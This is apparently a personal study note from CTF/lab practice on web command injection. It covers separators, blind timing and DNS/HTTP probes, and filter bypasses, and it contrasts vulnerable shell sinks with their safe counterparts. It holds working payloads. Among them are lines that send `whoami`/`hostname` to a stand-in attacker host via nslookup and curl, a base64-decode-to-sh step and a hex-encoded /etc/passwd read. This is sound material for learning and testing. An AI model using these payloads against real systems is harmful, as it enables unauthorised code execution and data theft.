---
type: technique
platform: web
status: working
fluency: guided
source: thm
updated: 2026-08-30
---

# Command Injection

The application takes something you typed and hands it to a shell. A ping tool, a DNS lookup form, a file converter, an "export" button, a filename passed to a resizing library — anywhere the server builds a command string out of user input and runs it. When it works the payoff is immediate and total: you are executing as the web server user, which is the end of the web phase and the start of [[Shells]].

The decision that governs everything below is whether the output comes back to you. In-band injection prints the command's output in the response; **blind** injection prints nothing at all, and looks exactly like an input that is not vulnerable. Most of this note is about telling those two apart, because assuming the second is the first is how an afternoon disappears.

## Confirm the sink exists

**Why now** — you have found an input whose value plausibly ends up in a command: it names a host, a file, an archive, a format. Before crafting anything you need one fact: does the shell see your metacharacters, or does the application escape them? Ask with something harmless that produces an unmistakable answer.

```text
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 %0a id
$(id)
`id`
```

- a leading valid value → keep the original command working. Many sinks abort before reaching your payload if the first argument is nonsense, and you learn nothing from the failure
- `;` → unconditional separator: your command runs whether or not the first one succeeded. The default choice, and the one to try first
- `&&` → runs only if the first command exits `0`. Use it when `;` is filtered, but remember a failing first command now silently suppresses yours — which reads as "not vulnerable"
- `|` → pipes the first command's output into yours. It also *replaces* the visible output with your command's, which sometimes makes a result appear where `;` showed nothing
- `%0a` → a URL-encoded newline. A shell treats it as a separator, and filters that block `;` and `&` routinely forget it. **The one most often left out**
- `$(...)` and backticks → substitution rather than separation. These work in places where no separator does, because the input is being quoted into an argument rather than concatenated
- when the input lands inside quotes, close them first: `"; id; #` or `'; id; #`

**What you will see**

- **Found** — `uid=33(www-data) gid=33(www-data)` in the response body, usually appended to or replacing the normal output. `www-data`, `apache`, `nginx`, `iis apppool\...` all confirm the same thing.
- **Empty** — the important case, and it means three different things. The input may be safely parameterised, and this is a dead end. Or the payload reached the shell and ran, but the output is discarded (the app shows only its own formatted result) — that is **blind injection** and it is fully exploitable. Or the payload never reached the sink at all because a filter stripped it silently. Nothing in the response distinguishes these; the next section does.
- **Error** — a 500 or a stack trace naming `sh: 1: ...` is a strong positive: the shell parsed your input and failed, which proves it got there. `Invalid hostname` from the application's own validator means a filter caught you before the shell — change encoding, not payload.
- **Noise** — the application echoing your input back into the page unchanged is reflection, not execution. Seeing `; id` printed in the response means your string survived to the HTML, which is [[XSS]] territory, not this note.

**Then** — a visible `uid=` ends this section; move to expanding it into a shell. Empty goes to the blind confirmation below and must not be read as "not vulnerable". An error naming a shell goes to the blind section too, with high confidence.

## Prove blind execution

**Why now** — the previous step returned nothing, and you cannot tell a hardened input from a silent one. These two probes do not need output: the first uses time as the channel, the second uses the network. Either turns "maybe" into "yes" in one request.

```text
; sleep 8
& ping -c 8 127.0.0.1 &
; nslookup $(whoami).probe.attacker.thm
; curl http://ATTACKER_IP/$(hostname)
```

- `sleep 8` → the timing probe. Pick a delay long enough to stand clear of normal latency; under 5 seconds is indistinguishable from a slow page on a [[Security-Terms#^vpn|VPN]]. Always request the same page once without the payload first, so you know the baseline response time
- `ping -c 8` → the Windows-and-Linux fallback when `sleep` is absent. On Windows use `ping -n 8 127.0.0.1`. Note `-c` / `-n`: without a count the ping never returns and the request hangs rather than delaying measurably
- `nslookup ... .attacker.thm` → the out-of-band probe. DNS leaves the target even when outbound HTTP is blocked, which makes it the more reliable of the two channels
- `$(whoami)` inside the hostname → smuggles the answer into the DNS query itself, so a single callback tells you both that you have execution and who you are
- listener → this only works if you are watching. `nc -lvnp 80`, a `tcpdump -i tun0 udp port 53`, or a collaborator service. **The step that is easy to skip**, and skipping it makes a successful injection look like a failed one

**What you will see**

- **Found** — a response that takes 8 seconds when the baseline was 200 milliseconds, repeated and consistent. Or a DNS query arriving at your listener with the hostname embedded. Either is proof of code execution.
- **Empty** — an immediate response and a silent listener. Now the empty result is meaningful: combined with the previous section it is decent evidence the input is not a command sink, so spend your remaining time on the *other* inputs in the same form rather than on more payloads for this one.
- **Error** — a delay that happens on *every* request including the clean baseline is network latency, not your `sleep`. A timeout at exactly 30 or 60 seconds is the web server's own execution limit expiring, which is itself weak evidence something is blocking.
- **Noise** — a single slow response proves nothing; pages are occasionally slow. Repeat the probe three times with two different delays (`sleep 3` versus `sleep 9`) and confirm the response time tracks the number you chose. That correlation is the actual proof.

**Then** — confirmed blind execution goes straight to a reverse shell, because you will never read output through this channel and there is no reason to try. Set up the listener first, then inject the payload from [[Shells]]. Confirmed silence sends you back to the application to look for a different sink, or across to [[File-Inclusion]] and [[SQL-Injection]] as adjacent paths to the same goal.

## Get past the filter

**Why now** — the sink is there (you proved it with timing or an error), but your payload is being rejected or stripped. The application is filtering characters or words, and filters look at one representation of your input while the shell sees another.

```text
;i''d               ;i""d              ;i\d
;/???/??t /???/p??s??
$IFS                ${IFS}             $IFS$9
$(printf '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
;echo aWQK | base64 -d | sh
```

- `i''d`, `i\d` → the shell strips empty quotes and backslash-escapes before executing, so these are all the word `id` to the shell and none of them to a blocklist matching `id`
- `/???/??t` → glob expansion; the shell resolves the wildcards to real paths. Defeats filters matching literal command names
- `$IFS` → the internal field separator, a space by default. The escape hatch when spaces are filtered. `${IFS}` and `$IFS$9` are variants for when the bare form gets consumed by the next character
- hex via `printf` → the same trick the original note recorded: `\x2f\x65\x74\x63...` is `/etc/passwd` with nothing a path-based filter recognises
- base64 → the general form. Encode the whole payload, decode and pipe to a shell on the target. Note this needs `base64` present, and the trailing newline matters: `echo` without `-n` is usually what you want here
- URL-encode once for transport, and remember the layers: the browser or `curl` decodes once, the application may decode again. `%2520` reaching the shell as `%20` reaching as a space is a real and common two-layer case. **An unencoded `&` in a GET parameter ends your payload at that character** and the rest silently becomes another parameter

Payload reference: `https://github.com/payload-box/command-injection-payload-list`.

**What you will see**

- **Found** — the same confirmations as the sections above: a `uid=` line, a measured delay, a DNS callback. The difference is you now know which encoding survives, which is what every subsequent payload must use.
- **Empty** — with the sink already proven, empty means this particular bypass is not the right one. That is a narrow, useful failure: change one variable at a time — separator, then space substitute, then command obfuscation — rather than swapping the whole payload.
- **Error** — a 403 served with a vendor page or a generic block message is a **[[Security-Terms#^waf|WAF]]**, and it is categorically different from a 403 from the application. A WAF 403 arrives fast, is identical for every blocked payload, and often names itself in a header. An application 403 varies with the request. Against a WAF, change encoding; against the app, change the payload
- **Noise** — an application that silently strips characters rather than rejecting them will return a perfectly normal 200 for every attempt. Confirm what actually arrives by echoing a marker you can see, or by comparing response lengths across payload variants.

**Then** — a working bypass goes to [[Shells]] for the payload, and to [[Burp-Suite]] if you need to iterate quickly through encodings on a request with tokens attached. A WAF you cannot get past with encoding means switch surface: another parameter, another endpoint, another vulnerability class.

## Where these sinks come from

In PHP, `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()` and backticks all reach a shell, and `escapeshellarg()` / `escapeshellcmd()` are what a developer is supposed to wrap the input in. In Python it is `os.system()` and `subprocess` called with `shell=True`; the same call with a list argument and no shell is safe. In Node it is `child_process.exec()` as opposed to `execFile()`.

That distinction is worth carrying because it tells you what to grep for the moment you can read server-side source. A `system("ping -c 4 " . $_GET['host'])` in a file recovered via [[Source-Code-Disclosure]] is the whole vulnerability, already proven, with the exact parameter name handed to you.

## Reading the output

Silence is the hardest signal in this note, and the reason it needs three sections rather than one. A blind injection and a properly parameterised input produce byte-identical responses. The only thing separating them is a channel that does not depend on the response body — time, or the network — so an injection test that has not used one of those has not finished.

The second whole-note point: proving execution and *using* it are different problems, and the second is usually easier. Once a `sleep` correlates, stop refining probes. You have arbitrary command execution as the web user; the remaining work is a listener and a payload, both in [[Shells]], not more careful reading of a response body that will never contain anything.

## Next

- [[Shells]] — turn one-shot execution into an interactive reverse shell
- [[File-Inclusion]] — the adjacent [[Security-Terms#^rce|RCE]] path when a raw command sink is filtered
- [[Burp-Suite]] — iterate encodings against a request that carries a session or a [[Security-Terms#^csrf|CSRF]] token

## Gaps

- Nothing on argument injection: input that reaches a command as a *flag* rather than a separator (`--output=/var/www/shell.php`), which needs no metacharacter at all.
- No Windows column beyond `ping -n`. `&`, `|` and `%0a` behave differently in `cmd.exe` and in PowerShell, and neither is covered.
- Nothing on identifying which WAF is in front of the application, which decides which encoding is worth trying.
